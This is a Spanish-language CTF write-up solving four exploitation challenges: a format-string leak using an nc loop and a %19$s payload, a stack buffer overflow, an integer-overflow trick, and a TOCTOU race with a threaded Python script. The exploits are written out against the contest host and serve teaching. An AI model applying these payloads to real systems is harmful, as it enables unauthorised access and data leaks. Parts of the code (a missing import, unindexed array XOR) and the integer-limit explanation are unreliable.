#### Loro (100pts)

##### Descripción:

Hemos contratado a un loro para que gestione las flags. Lo tenemos viviendo en el puerto 2323 

##### Solución:

Nos conectamos, y vemos que la aplicación imprime por pantalla aquello que escribimos. Esto podría ser vulnerable a `format strings` y abusar de los especificadores de formato para extraer información del stack. Para ello, se ha hecho el siguiente script, que nos permitira realizar una serie de iteraciones hasta obtener la flag, que se encontrará almacenada en alguna dirección del stack:

```
for i in {1..30}; do echo $i; echo -e "%$i\$s\n" | nc ctf.alphasec.xyz 2323; echo; done;
```
una vez que ya sabemos el offset, podemos introducir lo siguiente y obtendremos la flag:

`%19$s`

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/loro.png" width=350>


**Flag:** flag{passwordseña_dude}

#### Xorizo (125pts)

##### Descripción:

Hicimos el programa definitivo para superar estructuras discretas, pero al poner la contraseña, no conseguimos que descifre el secreto. La contraseña es "estructurasdiscretasjeje", pero al introducirla nos saca algo incomprensible...

Este es el código:

```c
void main(){

char pass[24] = "xxxxxxxxxxxxxxxxxxxxxxxx";
char x[10];

char flag[24] = ...;

char* res = malloc(24);

scanf("%s", x);
printf("%s\n", pass);

int i;
for(i = 0; i < 24; i++)
res = pass ^ flag;

printf("%s\n", res);


}
```

¿Nos echas una mano? Está corriendo en `ctf.alphasec.xyz:2424`

##### Solución:

Este reto es un ejemplo sencillo de buffer overflow. Como se puede observar, no hay ningún mecanismo que compruebe o limite el contenido que se esta leyendo, es decir, que un atacante podría utilizar esto para sobreescribir información que se encuentre en el stack.

Como sabemos, el stack almacena la información según el tipo LIFO (_Last Input First Output_), entonces el primer valor que se carga en el stack será el valor de `pass` cuyo contenido esta relleno del caracter `x` y que debería contener `estructurasdiscretasjeje` en su lugar. El siguiente valor a entrar en la pila es el de la variable `x`, que tiene destinado 10 bytes de memoria en el stack. De manera representativa quedaría tal que así intrudiciendo lo siguente:

`x = AAAAAAAAAA`

| x (10 bytes) | pass (24 bytes) |
| ------------ | ------------ |
| AAAAAAAAAA  |  xxxxxxxxxxxxxxxxxxxxxxxx |

Si introducimos más caracteres de los que tiene asignados, al no tener ningún tipo de mecanismo de verificación, pasará a escribir el valor de `pass`, por ejemplo:

`x = AAAAAAAAAAHOLA`

| x (10 bytes) | pass (24 bytes) |
| ------------ | ------------ |
| AAAAAAAAAA  |  HOLAxxxxxxxxxxxxxxxxxxxx |

Siguiendo este mismo concepto, podemos utilizarlo para asignar la clave que se nos ha proporcionado en el enunciado para poder conseguir la flag:

`x = AAAAAAAAAAestructurasdiscretasjeje`

| x (10 bytes) | pass (24 bytes) |
| ------------ | ------------ |
| AAAAAAAAAA  |  estructurasdiscretasjeje |

Y con eso, ya hemos conseguido la flag:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/xorizo.png" width=350>

**Flag:**  flag{lohacehastaunperro}

#### Numerao, numerao... (150pts)

##### Descripción:

¡Viva la numeración!

En `ctf.alphasec.xyz:2525` tenemos un sistema que sólo acepta a los números positivos, pero sobre todo le tiene tirria a los ceros. Si tras operar con las entradas obtuviese un 0... No queremos imaginarnos qué resultado catástrofico podría tener.

##### Solución:

En este caso, tratamos con una forma de explotación conocida como `Integer Overflows` y esto se produce cuando se sobre pasa el límite de `MAX_INT`.

`INT_MAX = +2147483647` 

Empezando a contar desde 0, por lo que el límite estaría en `+2147483646`. Por lo que el intervalo iria de:

-2147483648 < valor < +2147483647`

Viendo la representación binaria:


| +2147483647 |
| ------------ |
|01111111111111111111111111111111  |

Sin embargo, al introducir este número, nos damos cuenta de que lo interpreta como si fuese como un `-1`, por lo que me lleva a pensar, que hay algún tipo de comprobación en el código que obvia el bit de signo o lo trata como un signed int de 31 bits (1 bit de signo y 30 bits representación númerica). Sea lo que fuere, podemos abusar de esto sin estar realmente haciendo un `Integer Overflow`. Resultando en la suma:

```
2147483647
2147483647
2
```

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/numerao.png" width=350>


**Flag:** flag{pavoreal_uuu}

#### Corre Chicote (200pts)

##### Descripción:

Chicote es el mejor cocinero, porque corre:

`ctf.alphasec.xyz:5000`

##### Solución:

Cuando entramos al sitio web podemos observar lo siguiente:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/chicote2.png" width=350>

- El primer link intenta leer la flag de un archivo, sin embargo no posee permisos necesario para la lectura.
- El segundo link, comprueba que la flag que hay en el fichero no haya cambiado.

Aquí estamos ante un caso que se conoce como _Time of Check - Time of Use_ y es un caso concreto de condición de carrera y cuyo funcionamiento sigue el siguiente principio:

> Los errores  generados como consecuencia de una condición de carrera  se producen por el  cambio  que  experimenta  el  estado  de un recurso  (ficheros, memoria, registros,  etc.)  desde  que se comprueba su valor hasta que se utiliza. Este tipo de errores pueden convertirse en  vulnerabilidades  serias  cuando  un  atacante  puede  influir  en  el cambio de estado  en tre  la  comprobación y  su uso.  Generalmente este tipo de problemas suelen darse bien por la  interacción entre hilos  en  un  proceso  multihilo  o  bien  por la concurrencia  de  otros  procesos ajenos al proceso vulnerable. 

Por ejemplo:

Si consideramos esta aplicación web, la aplicación permite verificar si la flag ha sido modificada, para ello tiene que tener privilegios de lectura del archivo. Por lo tanto si conseguimos hacer una petición para leer el fichero de la flag después de que sea abierto por el proceso de verificación para ver si se ha modificado, y antes de que este mismo proceso cierre el recurso, podremos leer la flag.

¿Por qué pasa esto?

Este tipo de ataques es posible porque los servidores web como Apache procesan las peticiones de manera asíncrona. Eso quiere decir, que si dos peticiones llegan más o menos al mismo tiempo (en un CPU multicore), el resultado será procesado como en el mostrado a continuación:

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/toctou.png" width=350>

Para hacer que coincidan las peticiones justo una detrás de la otra, tendremos que crear un script con hilos que nos permita realizar varias peticiones, hasta que podamos leer la flag.

[@KaoRz](https://github.com/KaoRz) fue uno de los primeros en resolver este reto y consiguió llegar a la final. Su script lo pueden encontrar en [este gist que publicó](https://gist.github.com/KaoRz/44ed827c258054577fc59cd70a9f381d).

<img src="https://raw.githubusercontent.com/M3moryLeaks/ctf/2019/UAH/Exploiting/Images/chicote.jpg" width=350>


```python
import os
import requests
import threading

url = 'http://ctf.alphasec.xyz:5000/'
s = requests.Session()

def verify():
    for i in range(10):
        res = s.get(url+'verify')

def readFlag():
    for i in range(10):
      res_read = s.get(url+'read')
      if 'flag' in res_read.text:
          flag = re.search(r"(flag{\w+})", res_read.text)
          print("\n[!] The flag is: {}".format(flag.group(1)))

try:
   verify_thread = threading.Thread(target = verify)
   readFlag_thread = threading.Thread(target = readFlag)
   verify_thread.start()
   readFlag_thread.start()
except Exception as e:
    pass
```

**Flag:** flag{yokomoenyakitoro}
